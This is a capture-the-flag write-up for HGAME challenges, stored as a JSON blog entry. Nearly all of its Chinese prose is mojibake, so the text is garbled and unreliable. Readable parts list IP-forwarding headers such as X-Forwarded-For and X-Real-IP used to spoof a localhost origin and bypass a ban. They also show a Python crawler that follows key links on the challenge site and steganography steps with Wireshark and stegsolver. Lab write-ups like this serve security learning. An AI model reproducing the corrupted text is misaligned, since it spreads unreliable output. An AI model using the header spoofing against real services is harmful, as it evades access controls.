100Âç≥ÂèØ\n\n‰πãÂêéÂèàË¶ÅÊ±ÇÂÖ∂ËØ∑Ê±Ç‰ªéÊú¨Âú∞ÂèëÂá∫Êù•\n\nÈÇ£ÂèØ‰ª•‰ΩøÁî®‰º™ÈÄ†ËØ∑Ê±ÇIPÁöÑÊñπÊ≥ïÔºåÂèàÂ¶Ç‰∏ãÂá†Áßç\nX-Forwarded-For:\nX-Forwarded-Host:\nX-Client-IP:\nX-remote-IP:\nX-remote-addr:\nTrue-Client-IP:\nClient-IP:\nX-Real-IP:\n\nÂÖ®ÈÉΩËØï‰∏ÄÈÅçÂèëÁé∞Âè™ÊúâX-Real-IPÊ≤°ÊúâË¢´banÔºå‰º™ÈÄ†IP‰∏∫Êú¨Âú∞127.0.0.1\n\nÊâßË°åÂêéÊàêÂäüÊãøÂà∞flag\n\nËõõËõõ‚Ä¶ÂòøÂòø‚ô•ÊàëÁöÑËõõËõõËøôÈ¢ò‰πüÊòØ‰∏™Â∞èÊ∏∏ÊàèÔºåËøô‰∏™ÊåâÈíÆ‰πüÊòØË∂äÁÇπË∂äÂ§öÔºåËÄå‰∏îÂè™Êúâ‰∏Ä‰∏™ÊòØÁúüÁöÑ„ÄÇÂÖàÁé©Âá†ÂÖ≥Áúã‰∏Ä‰∏ãÂÆÉÂìçÂ∫îÁöÑÂÜÖÂÆπÔºåÂæàÊúâËßÑÂæã„ÄÇ\nÊØèÊ¨°ÈÉΩ‰ºöÂú®ÂéüurlÂü∫Á°Ä‰∏äÊãºÊé•‰∏Ä‰∏™?key=##########„ÄÇÈÇ£Áõ¥Êé•‰∫§ÁªôÁà¨Ëô´„ÄÇ\n\n‰∏çÂ∫üËØùÔºå‰∏ä‰ª£Á†Å„ÄÇ\nimport requests\nimport time\ndef run(url):\n    newUrl = url\n    while True:\n        response = requests.get(newUrl)\n        print(response.text[response.text.find('&lt;h1>')+4:response.text.find('&lt;/h1>')])\n        index = response.text.find('?key')# Ê≤°ÊúâÊâæÂà∞findËøîÂõû-1\n        if index == -1:\n            print(newUrl)\n            exit(0)\n        text = response.text[index:]\n        newUrl = url + text[:text.find('\">')]\n        time.sleep(0.5)\nif __name__ == '__main__':\n    run('https://hgame-spider.vidar.club/90bc5cb81b')\n\n\nÂèëÁé∞Âú®100ÂÖ≥ÂêéÈù¢ÔºåÁÇπÂºÄÁà¨Âà∞ÁöÑurl\n\nÂú®ËØ∑Ê±ÇÂ§¥ÈáåÂèëÁé∞flag\nMiscÂ•ΩÂ∫∑ÁöÑÊµÅÈáè‰∏ãËΩΩÈôÑ‰ª∂ÊãøÂà∞‰∏Ä‰ªΩÊà™Ëé∑ÁöÑÊµÅÈáèÔºåÁî®wiresharkÊâìÂºÄÁî®ÂØºÂá∫‰∏∫ÈÇÆ‰ª∂\n\nÊãøÂà∞Ê∂©Âõæ\n\nËøô‰∏™ÂõæÁâáËØï‰∫ÜÂæàÂ§öÊñπÊ≥ïÔºåÊúÄÂêéÂèëÁé∞‰ΩøÁî®stegsolverÊâìÂºÄÂèëÁé∞‰∏Ä‰∏™Êù°ÂΩ¢Á†Å„ÄÇ\n\nÊâ´Á†ÅÊãøÂà∞‰∏ÄÂçäÁöÑflag„ÄÇ\nËøòÊúâ‰∏ÄÂçäÂ∫îËØ•ÊòØlsbÈöêËóèÁöÑ„ÄÇ\n\n‰ΩøÁî®Â∑•ÂÖ∑ÊãøÂà∞Âè¶‰∏ÄÂçä„ÄÇÔºàËøôÈáåÂÖ∂ÂÆûÊòØËØïÂá∫Êù•ÁöÑÔºâ\nÈ•≠Âç°ÁöÑuno‰∏ãËΩΩÈôÑ‰ª∂‰ΩøÁî® 010editorÊâìÂºÄÂ∞±ÊòØflag\n\n","categories":["CTF-WP"],"tags":["CTF","HGAME"]}]